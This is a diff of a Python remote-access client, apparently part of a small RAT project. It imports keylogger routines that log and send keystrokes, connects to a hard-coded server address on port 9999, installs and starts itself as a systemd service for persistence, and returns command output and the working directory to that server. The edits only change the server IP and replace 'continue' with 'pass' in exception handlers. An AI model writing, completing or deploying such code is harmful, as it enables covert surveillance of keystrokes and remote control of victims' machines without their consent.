@@ -8,7 +8,7 @@ from scanner import p_arg, s_arg
 from keylogger import log_keystrokes, start_keylogger, send_keylogs
 import threading
 
-HOST = '192.168.137.7'  # change that to the IP address of the server
+HOST = '10.147.17.117'  # change that to the IP address of the server
 PORT = 9999
 
 
@@ -92,7 +92,7 @@ WantedBy=multi-user.target
         os.system("systemctl enable client.service")
         os.system("systemctl start client.service")
     except Exception as e:
-        continue
+        pass
 
 
 
@@ -129,7 +129,7 @@ def connect_to_server():
 
                     s.send(str.encode(output_str + os.getcwd() + '> '))
     except Exception as e:
-        continue
+        pass
     finally:
         s.close()
 
